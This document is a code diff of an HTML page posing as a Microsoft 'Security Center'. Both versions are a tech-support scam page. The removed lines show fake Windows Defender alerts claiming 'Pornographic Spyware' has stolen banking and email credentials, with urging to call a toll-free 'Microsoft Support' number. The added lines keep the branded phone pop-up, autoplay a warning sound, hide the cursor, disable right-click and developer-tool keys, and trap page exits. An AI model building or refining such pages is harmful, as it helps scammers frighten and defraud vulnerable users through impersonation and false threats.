@@ -1,311 +1,72 @@
+
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-<script type="text/javascript">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Security Center</title>
+
+  <!-- Fonts & CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="css/5f205bb74a5eb_v.css" />
+  <link rel="stylesheet" href="css/5f205bb63ccd2_v.css" />
+  <link rel="stylesheet" href="css/5f205bc497791_v.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css" />
+
+  <!-- jQuery & Bootstrap JS -->
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+
+  <!-- Clarity -->
+  <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "rcx4ibbzzu");
-</script>
+  </script>
 
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Security Center</title>
-
-<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
-<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-
-<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-<style type="text/css">
-.blink {
-    background-color: #659e1d;
-    animation: blink-animation 1s steps(5, start) infinite;
-    -webkit-animation: blink-animation 1s steps(5, start) infinite;
-}
-
-@keyframes blink-animation {
-    to {
-        visibility: hidden;
+  <!-- Inline Styles -->
+  <style>
+    .blink {
+      background-color: #659e1d;
+      animation: blink-animation 1s steps(5, start) infinite;
+      -webkit-animation: blink-animation 1s steps(5, start) infinite;
     }
-}
+    @keyframes blink-animation { to { visibility: hidden; } }
+    @-webkit-keyframes blink-animation { to { visibility: hidden; } }
+  </style>
 
-@-webkit-keyframes blink-animation {
-    to {
-        visibility: hidden;
-    }
-}
-
-/* Original layout styles */
-#chat-box {
-    position: fixed;
-    right: 20px;
-    bottom: 20px;
-    background: white;
-    padding: 15px;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    z-index: 9999;
-    display: none;
-}
-
-.delayedPopupWindow {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 80%;
-    max-width: 700px;
-    background: white;
-    z-index: 9998;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.3);
-    display: none;
-}
-
-.alert_popup {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 80%;
-    max-width: 600px;
-    background: white;
-    z-index: 9997;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.3);
-    display: none;
-}
-
-.black {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.7);
-    z-index: 9996;
-    display: none;
-}
-
-.win1, .win2 {
-    position: fixed;
-    width: 400px;
-    background: white;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    z-index: 9995;
-    display: none;
-}
-
-#vir1, #vir2, #vir3, #vir4, #vir5 {
-    position: fixed;
-    right: 20px;
-    bottom: 100px;
-    background: white;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    z-index: 9994;
-    display: none;
-}
-
-/* Add all other original styles here */
-</style>
+  <!-- Disable Right Click, F12, Ctrl+U/C -->
+  <script>
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function (e) {
+      if (e.keyCode === 123 || (e.ctrlKey && ['u', 'c'].includes(String.fromCharCode(e.keyCode).toLowerCase()))) {
+        alert('Sorry, This Functionality Has Been Disabled!');
+        return false;
+      }
+    };
+  </script>
 </head>
 
-<body id="map" style="overflow: hidden; cursor: none;">
-
-<!-- Chat Box -->
-<div id="chat-box">
-    <img src="images/microsoft.jpg" width="40"><span style="color: #222; font-size: 21px; font-weight: 600; margin-left: 6px; position: relative; top: 5px;">Microsoft</span>
+<body id="map" onbeforeunload="return 'Write something clever here...';" style="overflow: hidden; cursor: none;">
+  <div id="chat-box">
+    <img src="images/microsoft.jpg" alt="Microsoft" />
+    <span style="color: #222; font-size: 21px; font-weight: 600; margin-left: 6px; position: relative; top: 5px;">Microsoft</span>
     <p style="font-weight: 600;">Contact Support</p>
-    <h4 style="font-weight: 600;" id="phone-display">+1-833-936-1274 (USA-Toll-Free)</h4>
-    <div class="arrow-down">
-        <i class="fa fa-caret-down"></i>
-    </div>
-</div>
+    <h4 style="font-weight: 600;">+1-833-936-1274 (USA-Toll-Free)</h4>
+    <div class="arrow-down"><i class="fa fa-caret-down"></i></div>
+  </div>
 
-<!-- Main Popup -->
-<div id="delayedPopup" class="delayedPopupWindow lightbox" style="background: white;">
-    <div class="row firewall-pro">
-        <div class="col-md-12">
-            <div class="green-box" style="box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5); border: 1px solid #aaa; padding: 10px;">
-                <div class="row">
-                    <div class="col-md-8">
-                        <div class="logo_micro" style="float: left; margin-left: 10px;">
-                            <img src="images/microsoft.jpg" width="30"><span style="color: #000; margin-left: 10px;">Windows Firewall Protection</span>
-                        </div>
-                    </div>
-                    <div class="col-md-4">
-                        <div class="minimize">
-                            <ul style="list-style: none; float: right;">
-                                <li style="cursor: pointer; display: inline-block; margin-left: 10px;"><img src="images/cut.png" style="width: 12px;"></li>
-                                <li style="cursor: pointer; display: inline-block; margin-left: 10px;"><img src="images/minus.png" style="width: 12px;"></li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <div class="row" style="margin-top: 20px;">
-        <div class="col-md-4">
-            <div class="microsoft-logo">
-                <img src="images/microsoft.jpg" width="80"><span style="font-size: 24px; margin-left: 10px;">Microsoft</span>
-            </div>
-        </div>
-        <div class="col-md-8">
-            <div class="formDescription">
-                <h2>Pornographic Alert - Error Code: #0x268d3(x7)</h2>
-                <p>Access to this PC has been blocked for security reasons.</p>
-                <p>Contact Windows Support: <strong id="phone-display2">+1-833-936-1274</strong></p>
-            </div>
-        </div>
-    </div>
-    
-    <footer id="footer" style="margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee;">
-        <div class="row">
-            <div class="col-md-6 left-code">
-                <p>Threat_Detected - Pornographic Spyware<br>
-                App: Ads.financetrack(1).exe</p>
-            </div>
-            <div class="col-md-6">
-                <div class="button_new" id="footer_btn" style="text-align: right;">
-                    <a href="#" class="btn btn-secondary">Run Anyway</a>
-                    <a href="#" class="btn btn-success blink" style="margin-left: 10px;">Back to Safety</a>
-                </div>
-            </div>
-        </div>
-    </footer>
-</div>
+  <audio autoplay>
+    <source src="media/0wa0rni0ng0.mp3" type="audio/mpeg" />
+  </audio>
 
-<!-- Alert Popup -->
-<div class="alert_popup cardcontainer lightbox">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-12">
-                <p class="text-center" style="font-size: 16px; font-weight: bold; margin-bottom: 5px; padding: 5px 10px; color: #414141; margin-top: 8px;">Windows_Defender - Security Warning</p>
-                <p class="text-center" style="font-weight: bold;">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
-                <p>Your computer has alerted us that it has been infected with a Pornographic Spyware. The following data has been compromised.</p>
-                <p>&gt; Email Credentials<br>
-                &gt; Banking Passwords<br>
-                &gt; Facebook Login<br>
-                &gt; Pictures &amp; Documents</p>
-                <p>Windows_Defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
-                <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.</p>
-                <p>Call Microsoft Support immediately to report this threat, prevent identity theft and unlock access to this device.</p>
-                <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
-                <p style="padding-bottom: 0px; text-align: center;">Call Microsoft Support: <strong id="phone-display3">+1-833-936-1274 (USA-Toll-Free)</strong></p>
-                <div class="action_buttons" style="text-align: center; margin-top: 20px;">
-                    <a class="btn btn-primary" id="leave_page" style="cursor: pointer;">OK</a>
-                    <a class="btn btn-secondary" id="leave_page" style="margin-left: 10px;">Cancel</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
+  <div class="example-box">
+    <img src="images/background-2.png" alt="Background" width="100%" />
+  </div>
 
-<!-- Background elements -->
-<div class="bg">
-    <div class="bgimg" style="top: 0px;"><img src="images/background-2.png" alt="" width="100%" style="display: none;"></div>
-    <div class="text"></div>
-</div>
-
-<!-- Overlay -->
-<a href="#" rel="noreferrer" style="cursor: none;" id="link_black">
-    <div class="black"></div>
-</a>
-
-<!-- Windows Defender UI Elements -->
-<div class="win1" style="top: 50px; left: 50px;">
-    <div class="header" style="background: #0078d7; color: white; padding: 8px; border-radius: 5px 5px 0 0;">
-        <img src="images/microsoft.png" class="ico" width="20">
-        <div class="name" style="display: inline-block; margin-left: 10px;">Microsoft-Windows-Defender Alert +1-833-936-1274 (USA-Toll-Free)</div>
-        <img src="images/win_min.png" class="win_min" style="float: right; margin-left: 10px; cursor: pointer;" width="20"> 
-        <img src="images/win_cls.png" class="win_cls" style="float: right; cursor: pointer;" width="20">
-    </div>
-    <!-- Rest of win1 content -->
-</div>
-
-<!-- Virus alerts -->
-<div id="vir1">
-    <div id="vir_tray" style="background: white; padding: 10px; border-left: 4px solid red;">
-        <div class="line_red" style="color: red;">
-            <span id="w4_1"><b>Threat Detected!</b></span><br>
-            Win32/Hoax.Renos.HX
-        </div>
-        <img src="images/ico_tray1.gif" class="ico_tray1" style="float: left; margin-right: 10px;" width="40">
-        <div class="txt1" id="w4_2" style="color: red; font-weight: bold;">High Risk</div>
-        <!-- Rest of virus alert content -->
-    </div>
-</div>
-
-<!-- JavaScript -->
-<script>
-// Phone number variables
-var phone_number = '+1-833-936-1274 (USA-Toll-Free)';
-var phone_number2 = '+1-833-936-1274';
-
-// Set phone numbers
-document.getElementById('phone-display').textContent = phone_number;
-document.getElementById('phone-display2').textContent = phone_number2;
-document.getElementById('phone-display3').textContent = phone_number;
-
-// Show elements with delay
-$(document).ready(function() {
-    // Initial delay
-    setTimeout(function() {
-        $(".black").fadeIn(500);
-        $("#delayedPopup").fadeIn(500);
-    }, 1000);
-    
-    // Secondary popup
-    setTimeout(function() {
-        $(".alert_popup").fadeIn(500);
-    }, 4000);
-    
-    // Chat box
-    setTimeout(function() {
-        $("#chat-box").fadeIn(500);
-    }, 8000);
-    
-    // Virus alerts
-    setTimeout(function() {
-        $("#vir1").fadeIn(500);
-    }, 5000);
-    
-    // Windows defender UI
-    setTimeout(function() {
-        $(".win1").fadeIn(500);
-    }, 3000);
-    
-    // Prevent right click
-    document.addEventListener('contextmenu', event => event.preventDefault());
-    
-    // Prevent F12
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123) return false;
-        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
-        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
-    };
-    
-    // Block leaving
-    window.onbeforeunload = function() {
-        return "Your system is at risk! Closing this window may lead to data loss.";
-    };
-});
-
-// Button actions
-$("#leave_page, .btn-ok, .btn-cancel").click(function() {
-    window.location.href = "index.html";
-});
-</script>
+  <footer class="text-center mt-5 text-muted">© 2025 BlinkAlert Security Center</footer>
 </body>
 </html>
